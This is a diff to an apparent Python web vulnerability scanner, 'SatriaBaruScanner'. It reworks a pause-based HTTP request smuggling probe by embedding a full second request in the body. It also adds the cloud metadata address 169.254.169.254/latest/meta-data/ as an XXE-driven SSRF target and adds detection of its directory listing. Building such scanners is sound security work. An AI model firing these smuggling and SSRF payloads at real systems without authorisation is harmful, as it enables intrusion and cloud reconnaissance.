@@ -7752,28 +7752,37 @@ class SatriaBaruScanner:
                 except (TypeError, ValueError):
                     pause_seconds = 6.0
                 pause_seconds = max(2.0, min(8.0, pause_seconds))
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", "30"), ("Connection", "keep-alive")],
-                    b"",
-                )
                 confirmed_trials: list[str] = []
                 for attempt in range(2):
                     if not self._within_budget():
                         break
                     unique_path = f"/404-{token}-{attempt}"
+                    # Body merupakan request kedua yang lengkap. CL disetel persis ke
+                    # panjang byte request itu; kirim header saja, tunggu read-timeout,
+                    # baru kirim body agar backend dapat memperlakukannya sebagai request baru.
+                    delayed_request = self._smug_get(unique_path, close=False)
+                    smuggle_headers = self._smug_build(
+                        f"POST {base_path} HTTP/1.1",
+                        [
+                            ("Host", cluster_host),
+                            ("Content-Length", str(len(delayed_request))),
+                            ("Connection", "keep-alive"),
+                        ],
+                        b"",
+                    )
                     self._scan_progress_event(
-                        f"HTTP smuggling 112: uji jeda {pause_seconds:.1f} dtk, percobaan {attempt + 1}/2"
+                        f"HTTP smuggling 112: jeda {pause_seconds:.1f} dtk setelah header; "
+                        f"percobaan {attempt + 1}/2"
                     )
                     sequence = [
-                        smuggle,
-                        self._smug_get(unique_path, close=False),
+                        smuggle_headers,
+                        delayed_request,
                         self._smug_get("/", close=True),
                     ]
                     responses, elapsed, err = self._smug_exchange(
                         sequence,
                         expect=2,
-                        timeout=max(8.0, pause_seconds + 4.0),
+                        timeout=max(10.0, pause_seconds + 6.0),
                         pause=pause_seconds,
                     )
                     second = responses[1] if len(responses) > 1 else None
@@ -7783,22 +7792,15 @@ class SatriaBaruScanner:
                         and baseline_status != 404
                     ):
                         confirmed_trials.append(
-                            f"attempt {attempt + 1}: HTTP 404 pada {unique_path} ({elapsed:.2f}s)"
+                            f"attempt {attempt + 1}: respons kedua HTTP 404 pada {unique_path} ({elapsed:.2f}s)"
                         )
-                    elif second is not None and second.get("status") in (400, 405, 501):
-                        response_body = (second.get("body") or "").lower()
-                        if re.search(r"invalid method|unrecognized method|bad request|gpost|gget", response_body):
-                            confirmed_trials.append(
-                                f"attempt {attempt + 1}: parser rejection HTTP {second['status']} ({elapsed:.2f}s)"
-                            )
                     if err == "budget_exhausted":
                         break
                 if len(confirmed_trials) == 2:
                     self._smug_mark(
                         112,
-                        f"Pause-based desync terkonfirmasi pada dua percobaan; baseline GET / "
-                        f"HTTP {baseline_status}; jeda {pause_seconds:.1f} dtk; "
-                        + "; ".join(confirmed_trials),
+                        f"Pause-based desync terkonfirmasi dua kali; baseline GET / HTTP {baseline_status}; "
+                        f"jeda {pause_seconds:.1f} dtk; " + "; ".join(confirmed_trials),
                         "smuggling_pause_based",
                     )
 
@@ -8096,6 +8098,18 @@ class SatriaBaruScanner:
             match = pattern.search(decoded)
             if match:
                 return label, match.group(0)
+
+        # Endpoint directory /latest/meta-data/ mengembalikan daftar nama field,
+        # bukan nilai ami-/i- secara langsung. Dua item metadata standar diwajibkan.
+        listing_markers = (
+            "ami-id", "instance-id", "local-ipv4", "hostname", "security-groups",
+        )
+        listing_hits = [
+            marker for marker in listing_markers
+            if re.search(r"(?i)(?<![A-Za-z0-9_-])" + re.escape(marker) + r"(?![A-Za-z0-9_-])", decoded)
+        ]
+        if len(listing_hits) >= 2:
+            return "EC2 instance metadata directory listing", ", ".join(listing_hits)
         return None
 
     def _xxe_endpoints(self, pages: list[Page]) -> list[str]:
@@ -8466,6 +8480,7 @@ class SatriaBaruScanner:
         if 76 not in self._confirmed and self._within_budget():
             self._scan_progress_event("XXE 76: SSRF ke metadata instance non-rahasia")
             metadata_uris = (
+                "http://169.254.169.254/latest/meta-data/",
                 "http://169.254.169.254/latest/meta-data/ami-id",
                 "http://169.254.169.254/latest/meta-data/instance-id",
             )
